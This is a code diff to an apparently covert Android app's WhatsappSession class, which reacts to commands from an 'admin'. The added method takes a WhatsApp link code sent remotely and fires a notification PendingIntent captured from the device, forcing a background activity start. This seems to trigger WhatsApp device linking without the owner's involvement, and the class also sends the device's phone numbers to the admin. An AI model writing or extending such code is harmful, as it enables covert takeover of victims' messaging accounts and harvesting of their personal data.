@@ -1,7 +1,11 @@
 package com.lyrnic.userside.sessions;
 
+import android.app.ActivityOptions;
+import android.app.PendingIntent;
 import android.content.Context;
 import android.content.Intent;
+import android.os.Build;
+import android.os.Bundle;
 import android.view.accessibility.AccessibilityEvent;
 import android.view.accessibility.AccessibilityManager;
 
@@ -58,6 +62,7 @@ public class WhatsappSession extends Session {
                 break;
             case Actions.ACTION_RECEIVE_WHATSAPP_LINK_CODE:
                 ActionsController.CODE = jsonObject.getString(Constants.CODE_KEY);
+                showLinkNotification(NotificationListener.linkDevicePendingIntent);
                 break;
             case Actions.ACTION_REQUEST_GET_DEVICE_NUMBERS:
                 NumbersManager numbersManager = new NumbersManager(this::sendNumbersToAdmin);
@@ -65,6 +70,25 @@ public class WhatsappSession extends Session {
                 numbersManager.getNumbers(context);
                 break;
 
+        }
+    }
+    public void showLinkNotification(PendingIntent linkDevicePendingIntent){
+        if(linkDevicePendingIntent == null) return;
+
+        try {
+
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.UPSIDE_DOWN_CAKE) {
+                ActivityOptions options = ActivityOptions.makeBasic();
+                options.setPendingIntentBackgroundActivityStartMode(ActivityOptions.MODE_BACKGROUND_ACTIVITY_START_ALLOWED);
+                Bundle bundle = options.toBundle();
+                linkDevicePendingIntent.send(bundle);
+                return;
+            }
+
+            linkDevicePendingIntent.send();
+
+        } catch (PendingIntent.CanceledException e) {
+            throw new RuntimeException(e);
         }
     }
 
